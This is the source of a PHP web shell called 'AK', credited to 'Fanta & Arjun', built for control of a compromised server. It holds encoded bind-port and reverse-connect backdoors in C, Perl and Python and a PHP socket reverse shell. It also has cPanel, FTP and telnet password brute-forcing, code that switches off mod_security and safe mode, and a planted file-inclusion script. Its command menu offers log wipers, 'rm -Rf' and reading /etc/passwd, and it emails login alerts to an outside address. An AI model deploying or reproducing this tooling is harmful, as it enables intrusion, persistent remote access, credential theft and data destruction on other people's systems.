		document.getElementById('myjoomla').style.display='block';
		document.getElementById('tableprefix').value="jos_";
		document.getElementById('smfipb').style.display='none';
		
	}
}
</script>
<body>
<?php
	
$back_connect_p="eNqlU01PwzAMvVfqfwjlkkpd94HEAZTDGENCCJC2cRrT1DUZCWvjqk5A/fcs3Rgg1gk0XxLnPT/bsnN60rZYthdKt4vKSNC+53sqL6A0BCuMCEK6EiYi4O52UZSQCkTHkoCGMMeKk/Llbdqd+V4dx4jShu7ee7PQ0TdCMQrDxTKxmTEqF2ANPe/U+LtUmSDdC98ja0NYOe1tTH3Qrde/md8+DCfR1h0/Du7m48lo2L8Pd7FxClqL1FDqqoxcWeE3FIXmNGBH2LMOfum1mu1aJtqibCY4vcs/Cg6AC06uKtIvX63+j+CxHe+pkLFxhUbkSi+BsU3eDQsw5rboUcdermergYZR5xDYPQT2DoFnn8OQIsvc4uw2NU6TLKPTwOokF0EUtJJgFu5r4wlFSRT/2UOznuJfOo2k+l+hdGnVmv4Bmanx6Q==";

$backconnect_perl="eNqlUl9rwjAQfxf8Drcqa4UWt1dLZU7rJmN2tNWXTUps45qtJiVNGf32S9pOcSAI3kNI7vcnd9z1boZlwYdbQoc55llZYFh4o1HA4m8s7G6n2+kXVSHwHmQ4oNfMLSpSXYL9if80dR7kuZYvpW110LzmJMPPiCYZVplup6hRI/CmL25owts8WizVRSWiIPTdyasJn1jknAm2rSjaY0MXca4PBtI/ZpTi+ChXbihJeESooSpZv99vTCAUiwgJ9pe72wykuv6+EVpjVAq2k62mRg2wHFMjCGeLpQna+LZhaSeQtwrNM5Dr+/+hnBMqQHOuiA+q2Qcj63zMUkRlI+cJlxhNWYITeKxgwr9KeonRda01Vs1aGRqOUwaW5ThBnSB0xxzHsmwo1fzBQjYoin3grQrMjyyS2KfwjHC5JYxXDZ7/tAQ4fpTiLFMoqHm1dbRrrhat53rzX0SL2FA=";

$bind_port_c="bZJRT9swEIDfK/U/eEVa7WJK0mkPrMukaoCEpnUT8DKVKjK2Q05LbMt2KGzw3+ekKQ0Zfkn83efL3TkHoHhRCYk+Oy9AT/Mvw8FBh1lQdz1YKQhuDyrpxe1/p0UBWwjKo5KBwvULs3ecIp4ziyaTsLkn6O9wgMKqo45yCvPtvnHM6kO0bkEoqOLB0fw3E8KmoJBtQ4LJUisc04jsZJQ0pvR4cZ5eLM+u6dWPr9/Sq+vLs8X3vQcZfucIstJXVqGjuMV26kClGSuheAyZ2hSvgkZbH0K518ph5jXgup1VvCbklVfXOnXNo9ULfLFcnJ5epovlr517C0pgRxHudYkm5L2lKHqIX0ouwhVIVcsfd2iTQyFx/DLLZn4J41waH8Ro328zrcrMMH+TxW+wWZdtLHgZ4Ognc26jrfg0oiddwUomQtxQB3+kzrAh3WimLYYkmkP9exWhC0PmcHhI9kZ7KQibFaxRkqDxjRoT9PTUJTaQ3pl6bYUQj8adb0LWTJWXZntDszU1pM4T9VK4xzDYEo+Ow2UcuxwdwahbOy+0C63v0PNw8PwP";

$bind_port_p="bZFvS8NADMZft9DvkNUxW6hsw5f+wbJVHc5WelUQldK1mTucd6W94cTtu3tpN1DxXS753ZMnyUGnv6qr/oyLfonV0jK77DqYTs/sJlUv4IjbJ5bJ5+Bc+PHVA5zC0IUvwDVXztA9ga1lrmoEJvM3VJqsm8BhXu/uMp2EQeL1WDS6SVkSB/6t94qqrKSSs0+RvaNzqPLy0HVhs4GCI9ijTCjIK8wUQqv0LKh/jYqesiRlFk1T0tTaLErj4J4F/ngce9qOZWrbhWaIzoqiSrlwumT8afDiTULiUj98/NtSliiglNWu3ZLXCoWWOf7DtYUf5MeCL9GhlVimkeU5aoejKAw9RmYMPnc6TrfkxdlcVm9uixl7PSEVUN4G2m+nwDkXWADxzW+jscWS8ST07NMe6dq/8tF94tnn/xSCOP5dwDXm0N52P1FZcT0RIbvhiFnpxbdYO59h5Eup70vYTogrGFCoL7/9Bg==";
shellstyle();
?>
<div align="center">
<a href="<?php $_SERVER['PHP_SELF'];?>"><font size="6" color="#FF0000" style="text-decoration:none;" face="Times New Roman, Times, serif">AK : By Arjun </font></a>

</div>
<hr color="#1B1B1B">
	
<table cellpadding="0" style="width:100%;">
	<tr>
		<td colspan="2" style="width:75%;">System Info : <font class="txt"><?php systeminfo(); ?></font></td>
		<td style="width:10%;">Server Port : <font class="txt"><?php serverport(); ?></font></td>	
		<td style="width:15%;"><a href=# onClick="maindata('com')"><font class="txt"><i>Software Info</i></font></a></td>
	</tr>
	<?php if($os != 'Windows' || shell_exec("id") != null) { ?><tr>
		<td style="width:75%;" colspan="2">Uid : <font class="txt"><?php echo shell_exec("id"); ?></font></td>
		<?php $d0mains = @file("/etc/named.conf");
			$users=@file('/etc/passwd');
        if($d0mains)
        { 
			$count;  
			foreach($d0mains as $d0main)
			{
				if(@ereg("zone",$d0main))
				{
					preg_match_all('#zone "(.*)"#', $d0main, $domains);
					flush();
					if(strlen(trim($domains[1][0])) > 2)
					{
						flush();
						$count++;
			   		} 
			   	}
			}
		?><td colspan=2 style="width:75%;">Websites : <font class="txt"><?php echo "$count  Domains"; ?></font></td><?php
		}
		else if($users) 
		{
			$file = fopen("/etc/passwd", "r");
			while(!feof($file))
			{
				$s = fgets($file);
				$matches = array();
				$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
				$matches = str_replace("home/","",$matches[1]);
				if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
				continue;
				$count++;
			}
		 ?><td colspan=2 style="width:75%;">Websites : <font class="txt"><?php echo "$count  Domains"; ?></font></td><?php } ?>
	</tr><?php } ?>
	<tr>
		<td style="width:20%;">Disk Space : <font class="txt"><?php echo HumanReadableFilesize(diskSpace()); ?></font></td>
		<td style="width:20%;">Free Space : <font class="txt"><?php echo HumanReadableFilesize(freeSpace()); $dksp = diskSpace(); $frsp = freeSpace(); echo " (".(int)($frsp/$dksp*100)."%)"; ?></font></td>
		
		<td style="width:20%;">Server IP : <font class="txt"><a href="http://whois.domaintools.com/<?php serverip(); ?>"><?php serverip(); ?></a></font></td>
		<td style="width:15%;">Your IP : <font class="txt"><a href="http://whois.domaintools.com/<?php yourip(); ?>"><?php yourip(); ?></a></font></td>
	</tr>
	
	<tr>
		<?php if($os == 'Windows'){ ?><td style="width:15%;">View Directories : <font class="txt"><?php echo showDrives();?></font></td><?php } ?>
		<td style="width:30%;">Current Directory : <span id="crdir"><font color="#009900">
		<?php 
	$d = str_replace("\\",$directorysperator,$dir);
	if (substr($d,-1) != $directorysperator) {$d .= $directorysperator;}
	$d = str_replace("\\\\","\\",$d);
	$dispd = htmlspecialchars($d);
	$pd = $e = explode($directorysperator,substr($d,0,-1));
	$i = 0;
	foreach($pd as $b)
	{
	 $t = '';
	 $j = 0;
	 foreach ($e as $r)
	 {
	  $t.= $r.$directorysperator;
	  if ($j == $i) {break;}
	  $j++;
	 }
$href=addslashes($t);
	
	 echo "<a href=javascript:void(0) onClick=\"changedir('dir','$href')\"><b><font class=\"txt\">".htmlspecialchars($b).$directorysperator.'</font></b></a>';
	 $i++;
	}

		?>
		</font></span> <a href=# onClick="gethome('home','<?php echo addslashes(getcwd()); ?>')">[Home]</a></td>
		<td style="width:20%;">Disable functions : <font class="txt"><?php echo getDisabledFunctions(); ?> </font></td>
		<td>Safe Mode : <font class=txt><?php echo safe(); ?></font></td>
		<?php if($os == "Linux") { ?><td><a href="<?php echo $self.'?downloadit'?>"><font color="#FF0000">Download It</font></a><?php } ?></td>
	</tr>
	</table>
	
<?php $m1 = array('Symlink'=>'symlinkserver','Forum'=>'forum','Sec. Info'=>'secinfo','Code Inject'=>'injector','Bypassers'=>'bypass','Server Fuzzer'=>'fuzz','Zone-h'=>'zone','DoS'=>'dos','Mail'=>'mailbomb','Tools'=>'tools','PHP'=>'phpc','Exploit'=>'exploit','Connect'=>'connect');
	$m2 = array('SQL'=>'database','404 Page'=>'404','Malware Attack'=>'malattack','Cpanel Cracker'=>'cpanel','About'=>'about');
	echo "<table border=3 style=border-color:#333333; width=100%; cellpadding=2>
	<tr>";
	$menu = '';

	foreach($m1 as $k => $v)
		$menu .= "<td style=\"border:none;\"><a href=# onClick=\"maindata('".$v."')\"><font class=\"mainmenu\">[".$k."]</font></a></td>";
		echo $menu;
		echo "</tr>
</table>
<div style=\"float:left;\">
	<a href=\"javascript:history.back(1)\"><font class=txt size=3> [Back] </font></a>&nbsp;
	<a href=\"javascript:history.go(1)\"><font class=txt size=3> [Forward] </font></a>&nbsp;
	<a href=\"\"><font class=txt size=3> [Refresh] </font></a></div>
<table style=\"margin-left:270px; border-color:#333333;\" border=2 width=60%; cellpadding=2>
	<tr align=center>";
	foreach($m2 as $k => $v)
		$menu1 .= "<td style=\"border:none;\"><a href=# onClick=\"maindata('".$v."','".addslashes($_GET['dir'])."')\"><font class=\"mainmenu\">[".$k."]</font></a></td>";
		echo $menu1;
		echo "<td style=\"border:none;\"><a href=javascript:void(0) onClick=\"if(confirm('Are You Sure You Want To Kill This Shell ?')){getmydata('selfkill');}else{return false;}\"><font class=mainmenu>[SelfKill]</font></a></td>
		<td style=\"border:none;\"><a href=\"$self?logout\"><font class=mainmenu>[LogOut]</font></a></td>
	</tr>
</table>";?>

<div id="showmaindata"></div>
<?php

if(isset($_GET["downloadit"]))
{
	$FolderToCompress = getcwd(); 
	execmd("tar --create --recursion --file=backup.tar $FolderToCompress"); 
	
	$prd=explode("/","backup.tar");
	for($i=0;$i<sizeof($prd);$i++)
	{
		$nfd=$prd[$i];
	}
	@ob_clean(); 
   header("Content-type: application/octet-stream"); 
   header("Content-length: ".filesize($nfd)); 
   header("Content-disposition: attachment; filename=\"".$nfd."\";"); 
   readfile($nfd);
   exit;	
}
//Turn Safe Mode Off

	if(getDisabledFunctions() != "None" || safe() != "OFF")
	{
	   	$file_pointer = fopen(".htaccess", "w+");
		fwrite($file_pointer, "<IfModule mod_security.c>
    				SecFilterEngine Off
   					 SecFilterScanPOST Off
					</IfModule> \n\r"); 
			
		$file_pointer = fopen("ini.php", "w+");
		fwrite($file_pointer, "<?
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"file\"]);
ini_restore(\"safe_mode\");
ini_restore(\"open_basedir\");
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"ss\"]);
?>"); 

		$file_pointer = fopen("php.ini", "w+");
		fwrite($file_pointer, "safe_mode               =       Off"); 
					
		fclose($file_pointer); 
		
    }
	
	else if(isset($_POST['cpanelattack']))
	{
		if(!empty($_POST['username']) && !empty($_POST['password']))
		{
				$userlist=explode("\n",$_POST['username']);
				$passlist=explode("\n",$_POST['password']);
	
				if($_POST['cracktype'] == "ftp")
				{
					foreach ($userlist as $user)
					{
						$pureuser = trim($user);
						foreach ($passlist as $password )
						{
							$purepass = trim($password);
							ftp_check($_POST['target'],$pureuser,$purepass,$connect_timeout);
						}
					}
				}
				if ($_POST['cracktype'] == "cpanel" || $_POST['cracktype'] == "telnet")
				{
					if($cracktype == "telnet")
						$cpanel_port="23";
					else
						$cpanel_port="2082";
					foreach ($userlist as $user)
					{
						$pureuser = trim($user);

						echo "<b><font face=Tahoma style=\"font-size: 9pt\" color=#008000> [ - ] </font><font face=Tahoma style=\"font-size: 9pt\" color=#FF0800>
						Processing user $pureuser ...</font></b><br><br>";

						foreach ($passlist as $password )
						{
							$purepass = trim($password);
							cpanel_check($_POST['target'],$pureuser,$purepass,$connect_timeout);

						}
					}
				}
			}
			else
				$bdmessage =  "<center>Enter Username & Password List<center>";
		}
	
else if(isset($_GET['info']))
{
	$bdmessage = "<br><div align=left><font class=txt>".nl2br(shell_exec("whois ".$_GET['info']))."</font></div>";
}
else if(isset($_POST['u']))
{
	$path = $_REQUEST['path'];
	if(is_dir($path))
        {
		$setuploadvalue = 0;
            $uploadedFilePath = $_FILES['uploadfile']['name'];
            $tempName = $_FILES['uploadfile']['tmp_name'];
			if($os == "Windows")
	            $uploadPath = $path . $directorysperator .  $uploadedFilePath;
			else if($os == "Linux")
				 $uploadPath = $path . $directorysperator . $uploadedFilePath;
			if($stat = move_uploaded_file($_FILES['uploadfile']['tmp_name'] , $uploadPath))
           		$bdmessage = "<font class=txt size=3><blink>File uploaded to $uploadPath</blink></font>";
            else
            	$bdmessage = "<font  size=3><blink>Failed to upload file to $uploadPath</blink></font>";
         }
	?><script type="text/javascript">changedir('dir','<?php echo addslashes($path); ?>'); </script><?php
}
else if(isset($_POST['backdoor']))
{
	if(isset($_POST['passwd']) && isset($_POST['port']) && isset($_POST['lang']))
	{	  ?><script type="text/javascript">gethome('connect');</script><?php
		 $passwd = $_POST['passwd'];
		 
		 if($_POST['lang'] == 'c') 
		 {
			if(is_writable("."))
			{	
				@$fh=fopen(getcwd()."/backp.c",'w');
				@fwrite($fh,gzinflate(base64_decode($bind_port_c)));
				@fclose($fh);
				execmd("chmod  0755 ".getcwd()."/backp.c");
				execmd("gcc -o ".getcwd()."/backp ".getcwd()."/backp.c");
				execmd("chmod  0755 ".getcwd()."/backp");
				execmd(getcwd()."/backp"." ".$_POST['port']." ". $passwd ." &");
				$scan = exec_all("ps aux | grep backp".$_POST['port']); 
				if(eregi("backp".$_POST['port'],$scan))
					$bdmessage = "Process found running, backdoor setup successfully.";
				else
					$bdmessage = "Process not found running, backdoor not setup successfully.";
			} 
			else 
			{
				@$fh=fopen("/tmp/backp.c","w");
				@fwrite($fh,gzinflate(base64_decode($bind_port_c)));
				@fclose($fh);
				execmd("chmod  0755 /tmp/backp.c");
				execmd("gcc -o /tmp/backp /tmp/backp.c");
				$out = execmd("/tmp/backp"." ".$_POST['port']." ". $passwd ." &");
				$scan = exec_all("ps aux | grep backp".$_POST['port']); 
				if(eregi("backp".$_POST['port'],$scan))
					$bdmessage = "Process found running, backdoor setup successfully.";
				else
					$bdmessage = "Process not found running, backdoor not setup successfully.";
			}
        	} 
		if($_POST['lang'] == 'perl') 
		{
        	if(is_writable("."))
			{	
				@$fh=fopen(getcwd()."/bp.pl",'w');
				@fwrite($fh,gzinflate(base64_decode($bind_port_p)));
				@fclose($fh);
				execmd("chmod 0755 ".getcwd()."/bp.pl");
				execmd("perl ".getcwd()."/bp.pl ".$_POST['port']." ". $passwd ." &");

				$bdmessage = "<pre>$out\n".execmd("ps aux | grep bp.pl")."</pre>"; 
			} 
			else 
			{
				@$fh=fopen("/tmp/bp.pl","w");
				@fwrite($fh,gzinflate(base64_decode($bind_port_p)));
				@fclose($fh);
				execmd("chmod 0755 ".getcwd()."/bp.pl");
				execmd("perl ".getcwd()."/bp.pl ".$_POST['port']." ". $passwd ." &");
				$bdmessage = "<pre>$out\n".execmd("ps aux | grep bp.pl")."</pre>"; 
			}
        }
 	}
}
else if(isset($_POST['backconnect']))
{
    if($_POST['ip'] != "" && $_POST['port'] != "")
	{     ?><script type="text/javascript">gethome('connect');</script><?php
		$host = $_POST['ip'];
		$port = $_POST['port'];
		if($_POST["lang"] == "perl")
		{
			if(is_writable("."))
			{	
				@$fh=fopen(getcwd()."/bc.pl",'w');
				@fwrite($fh,gzuncompress(base64_decode($backconnect_perl)));
				@fclose($fh);
				$bdmessage = "<font color='#FFFFFF'>Trying to connect...</font>";
				execmd("perl ".getcwd()."/bc.pl $host $port  &",$disable);
				if(!@unlink(getcwd()."/bc.pl")) echo "<font color='#FFFFFF' size=3>Warning: Failed to delete reverse-connection program</font></br>";
			} 
			else 
			{
				@$fh=fopen("/tmp/bc.pl","w");
				@fwrite($fh,gzuncompress(base64_decode($backconnect_perl)));
				@fclose($fh);
				$bdmessage = "<font color='#FFFFFF'>Trying to connect...</font>";
				execmd("perl /tmp/bc.pl $host $port  &",$disable);
				if(!@unlink("/tmp/bc.pl")) 
					echo "<h2>Warning: Failed to delete reverse-connection program</h2></br>";
			}
		}
		else if($_POST["lang"] == "python")
		{
			if(is_writable("."))
			{
				 $w_file=@fopen(getcwd()."/bc.py","w") or die(mysql_error());
				 if($w_file)
				 {
					 @fputs($w_file,gzuncompress(base64_decode($back_connect_p)));
					 @fclose($w_file);
					 chmod(getcwd().'/bc.py', 0777);
				 }
				 execmd("python ".getcwd()."/bc.py $host $port  &",$disable);
				 $bdmessage = "<font color='#FFFFFF'>Trying to connect...</font>";

				 if(!@unlink(getcwd()."/bc.py")) 
					echo "<h2>Warning: Failed to delete reverse-connection program</h2></br>";				 				 
			} 
			else 
			{
			     $w_file=@fopen("/tmp/bc.py","w");
				 if($w_file)
				 {
					 @fputs($w_file,gzuncompress(base64_decode($back_connect_p)));
					 @fclose($w_file);
					 chmod('/tmp/bc.py', 0777);
				 }
				 execmd("python /tmp/bc.py $host $port  &",$disable);
				 $bdmessage = "<font color='#FFFFFF'>Trying to connect...</font>";
				 if(!@unlink("/tmp/bc.py")) 
					echo "<h2>Warning: Failed to delete reverse-connection program</h2><br>";				 
			}
		}
		else if($_POST["lang"] == "php")
		{
			$bdmessage = "<font color='#FFFFFF'>Trying to connect...</font>";
			$ip = $_POST['ip']; 
			$port=$_POST['port']; 
			$sockfd=fsockopen($ip , $port , $errno, $errstr ); 
			if($errno != 0)
			{
				$bdmessage = "<font color='red'><b>$errno</b> : $errstr</font>";
			}
			else if (!$sockfd)
			{ 
				   $result = "<p>Fatal : An unexpected error was occured when trying to connect!</p>";
			} 
			else
			{ 
				fputs ($sockfd ,"\n=================================================================\nCoded By Fanta & Arjun\n=================================================================");
			 $pwd = exec_all("pwd");
			 $sysinfo = exec_all("uname -a");
			 $id = exec_all("id");
			 $len = 1337;
			 fputs($sockfd ,$sysinfo . "\n" );
			 fputs($sockfd ,$pwd . "\n" );
			 fputs($sockfd ,$id ."\n\n" );
			 fputs($sockfd ,$dateAndTime."\n\n" );
			 while(!feof($sockfd))
			 {  
				$cmdPrompt ="(AK)[$]> ";
				fputs ($sockfd , $cmdPrompt ); 
				$command= fgets($sockfd, $len);
				fputs($sockfd , "\n" . exec_all($command) . "\n\n");
			} 
			fclose($sockfd); 
			} 
		}
	}
}
else if (isset ($_GET['val1'], $_GET['val2']) && is_numeric($_GET['val1']) && is_numeric($_GET['val2'])) 
{
	$temp = "";
	for(;$_GET['val1'] <= $_GET['val2'];$_GET['val1']++) 
	{
		$uid = @posix_getpwuid($_GET['val1']);
		if ($uid)
			 $temp .= join(':',$uid)."\n";
	}
	echo '<br/>';
	paramexe('Users', $temp);
}
else if(isset($_GET['download']))
{
	download();			
}
else
{ 
	?><script type="text/javascript">gethome('home','<?php echo addslashes($dir); ?>');</script><?php
}	
$is_writable = is_writable($dir)?"<font class=txt>&lt; writable &gt;</font>":"&lt; not writable &gt;";
?>
</p><center><div id="showdir"><?php echo $bdmessage; ?></div></center>
<table style="width:100%;border-color:#333333;" border="1">
<tr>
<td align="center">
<form method="post" enctype="multipart/form-data">
Upload file : <br><input type="file" name="uploadfile" class="box" size="50">
<input type="hidden" id=path name="path" value="<?php echo $dir; ?>" />&nbsp;
<input type=submit value="Upload" name="u" value="u" class="but" ></form>
<span name="wrtble"><?php
echo $is_writable; ?></span>
		  <br>
</td>
<td align="center" style="height:105px;">Create File : 
<form onSubmit="createdir('Create',createfile.value);return false;">
<input type="text" class="box" value="<?php echo $dir . $directorysperator; ?>" name="createfile" id="createfile">
<input type="button" onClick="createdir('Create',createfile.value)" value="Create" class="but">
</form><span name="wrtble">
<?php echo $is_writable; ?></span>
</td>
</tr>
<tr>
<td align="center" style="height:105px;">Execute : <form onSubmit="executemyfile('execute','<?php echo addslashes($dir); ?>',execute.value);return false;">
<input type="text" class="box" name="execute">
<input type="hidden" id="exepath" name="exepath" value="<?php echo $dir; ?>">
 <input type="button" onClick="executemyfile('execute',exepath.value,execute.value)" value="Execute" class="but"></form></td>

<td align="center">Create Directory : <form onSubmit="createdir('createfolder',createfolder.value);return false;">
<input type="text" value="<?php echo $dir . $directorysperator; ?>" class="box" name="createfolder" id="createfolder">
<input type="button" onClick="createdir('createfolder',createfolder.value)" value="Create" class="but">
</form><span name="wrtble"><?php
echo $is_writable;
?></span></td></tr>
<tr><td style="height:105px;" align="center">Get Exploit&nbsp;<form onSubmit="getexploit(wurl.value,path.value,functiontype.value);return false;">
<input type="text" name="wurl" class="box" value="http://www.some-code/exploits.c"> 
<input type="button" onClick="getexploit(wurl.value,uppath.value,functiontype.value)" value="    G0    " class="but"><br><br>
<input type="hidden" id="uppath" name="uppath" value="<?php echo $dir . $directorysperator; ?>">
<select name="functiontype" class="sbox"> 
<option value="wwget">wget</option> 
<option value="wlynx">lynx</option> 
<option value="wfread">fread</option> 
<option value="wfetch">fetch</option> 
<option value="wlinks">links</option> 
<option value="wget">GET</option> 
<option value="wcurl">curl</option> 
</select>
</form><div id="showexp"></div>
</td>
<td align="center">
<form>
Some Commands<br>
<?php if($os != "Windows")
{ ?>
<SELECT NAME="mycmd" class="box">
     <OPTION VALUE="uname -a">Kernel version
     <OPTION VALUE="w">Logged in users
     <OPTION VALUE="lastlog">Last to connect
	 <option value='cat /etc/hosts'>IP Addresses
	 <option value='cat /proc/sys/vm/mmap_min_addr'>Check MMAP
	 <OPTION VALUE="logeraser">Log Eraser
	 <OPTION VALUE="find / -perm -2 -ls">Find all writable directories
	 <OPTION VALUE="find . -perm -2 -ls">Find all writable directories in Current Folder
	 <OPTION VALUE="find / -type f -name \"config*\"">find config* files
	 <OPTION VALUE="find . -type f -name \"config*\"">find config* files in current dir
	 <OPTION VALUE="find . -type f -perm -04000 -ls">find suid files in current dir
	 <OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins
     <OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD!
     <OPTION VALUE="find /etc/ -type f -perm -o+w 2> /dev/null">Write in /etc/?
	 <?php if(is_dir('/etc/valiases')){ ?><option value="ls -l /etc/valiases">List of Cpanel`s domains(valiases)</option><?php } ?>
	 <?php if(is_dir('/etc/vdomainaliases')) { ?><option value=\"ls -l /etc/vdomainaliases">List Cpanel`s domains(vdomainaliases)</option><?php } ?>
     <OPTION VALUE="which wget curl w3m lynx">Downloaders?
     <OPTION VALUE="cat /proc/version /proc/cpuinfo">CPUINFO
	 <OPTION VALUE="ps aux">Show running proccess
	 <OPTION VALUE="uptime">Uptime check
	 <OPTION VALUE="cat /proc/meminfo">Memory check
     <OPTION VALUE="netstat -an | grep -i listen">Open ports
	 <OPTION VALUE="rm -Rf">Format box (DANGEROUS)
     <OPTION VALUE="wget www.ussrback.com/UNIX/penetration/log-wipers/zap2.c">WIPELOGS PT1 (If wget installed)
     <OPTION VALUE="gcc zap2.c -o zap2">WIPELOGS PT2
     <OPTION VALUE="./zap2">WIPELOGS PT3
	 <OPTION VALUE="cat /var/cpanel/accounting.log">Get cpanel logs
 </SELECT>
 <?php } else {?>
 <SELECT NAME="mycmd" class="box">
   	<OPTION VALUE="dir /s /w /b *config*.php">Find *config*.php in current directory
	<OPTION VALUE="dir /s /w /b index.php">Find index.php in current dir
 	<OPTION VALUE="systeminfo">System Informations
	<OPTION VALUE="net user">User accounts
    <OPTION VALUE="netstat -an">Open ports
	<OPTION VALUE="getmac">Get Mac Address
	<OPTION VALUE="net start">Show running services
	<OPTION VALUE="net view">Show computers
	<OPTION VALUE="arp -a">ARP Table
	<OPTION VALUE="tasklist">Show Process
	<OPTION VALUE="ipconfig/all">IP Configuration
	
 </SELECT>
 <?php } ?>
 <input type="hidden" id="auexepath" name="auexepath" value="<?php echo $dir; ?>">
<input type="button" onClick="executemyfile('mycmd',auexepath.value,mycmd.value)" value="Execute" class="but">
</form>
</td>
</tr></table><br>
	
</td>
</tr>
</table>

<?php


//logout

if(isset($_GET['logout']))
{
    setcookie("hacked",time() - 60*60);
	header("Location:$self");
	ob_end_flush();
}	
?>


<hr color="#1B1B1B">
<div align="center">
<font size="6" face="Times New Roman, Times, serif" color="#00CC00"><br>
--==Coded By Fanta & Arjun==--</font><br><font color="#FF0000" size="6"></font></a></div>
<?php 
}	
}

if(isset($_POST['uname']) && isset($_POST['passwd']))
{
    if( hash("sha256",$_POST['uname']) == $user && hash("sha256",$_POST['passwd']) == $pass )
    {
$date = date('m/d/Y h:i:s a', time());
$urlforme1 = $_SERVER['REQUEST_URI'];
$ip = $_SERVER['REMOTE_ADDR'];
$name = $_SERVER["SERVER_NAME"];
$nameurl = $name.$urlforme1;
$host = gethostbyaddr($ip);
$to = "fanta@hackforums.net";
$subject = "Login Attempted, Access Granted Part 2 Verification";
$message = "Access to your shell V2 has been attempted and succeeded from $ip and located at $host on $date";
$from = "shell@$nameurl";
$headers = "From:" . $from;
mail($to,$subject,$message,$headers);
         setcookie("hacked", md5($pass));
		 $selfenter = $_SERVER["PHP_SELF"];
		 header("Location:$selfenter");
	}
elseif  (hash("sha256",$_POST['uname']) != $user && hash("sha256",$_POST['passwd']) != $pass) {
$date = date('m/d/Y h:i:s a', time());
$urlforme1 = $_SERVER['REQUEST_URI'];
$ip = $_SERVER['REMOTE_ADDR'];
$name = $_SERVER["SERVER_NAME"];
$nameurl = $name.$urlforme1;
$host = gethostbyaddr($ip);
$to = "fanta@hackforums.net";
$subject = "Login Attempted, Access Denied Part 2 Verification";
$message = "Access to your shell V2 has been attempted and failed from $ip and located at $host on $date";
$from = "shell@$nameurl";
$headers = "From:" . $from;
mail($to,$subject,$message,$headers);
}
}
		
if((!isset($_COOKIE['hacked']) || $_COOKIE['hacked']!=md5($pass)) )
{
		shellstyle();
?>
	<center>
	<form method="POST">
	<div style="background-color:#171717; width:50%; border-radius:7px; margin-top:150px; -moz-border-radius:25px; height:410px; background-image:url(Windows_7_-_Alien_from_outer_space.jpg);">
		<table cellpadding="9" cellspacing="4">
			<tr>
				<td align="center" colspan="2"><blink><font size="7"><b>AK</b></font></blink></td>
			</tr>
			<tr>
				<td align="right"><b>User Name : </b></td>
				<td><input type="text" name="uname" style="background-color:#333333; border-radius:7px; -moz-border-radius:10px; border-color:#000000; width:170px; color:#666666;"  value="User Name" onFocus="if (this.value == 'User Name'){this.value=''; this.style.color='black';}" onBlur="if (this.value == '') {this.value='User Name'; this.style.color='#828282';}" AUTOCOMPLETE="OFF"></td>
			</tr>
			<tr>
				<td align="right"><b>Password : </b></td>
				<td><input type="password" name="passwd" style="background-color:#333333; border-radius:7px; -moz-border-radius:10px; border-color:#000000; width:170px; color:#666666;"  value="User Name" onFocus="if (this.value == 'User Name'){this.value=''; this.style.color='black';}" onBlur="if (this.value == '') {this.value='User Name'; this.style.color='#828282';}" AUTOCOMPLETE="OFF"></td>
			</tr>
			<tr>
				<td align="center" colspan="2"><input type="submit" class="but" value="     Enter     "></td>
			</tr>
			<tr>
				<td align="center" colspan="2"><font size="6" face="Times New Roman, Times, serif"><b>--==Coded By Fanta & Arjun==--</b></font></td>
			</tr>
			<tr>
				<td colspan="2"><font size="4" face="Times New Roman, Times, serif"><noscript>Enable Javascript in your browser for the proper working of the shell</noscript></font></td>
			</tr>
 
		</table>
                       <tr>
<form action='' method='post'>
<span>__LOGOUT__</span><br><input type='submit' name='delete' value='logout'>
</form>
</tr>
	</div>
	
	</form>
	</center>
<br>
</body>
</html>
<?php
}
} elseif(isset($_SESSION['shelllist'])) {
$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');$GLOBALS['OOO0000O0']=$OOO000000{4}.$OOO000000{9}.$OOO000000{3}.$OOO000000{5}.$OOO000000{2}.$OOO000000{10}.$OOO000000{13}.$OOO000000{16};$GLOBALS['OOO0000O0'].=$GLOBALS['OOO0000O0']{3}.$OOO000000{11}.$OOO000000{12}.$GLOBALS['OOO0000O0']{7}.$OOO000000{5};?><?php 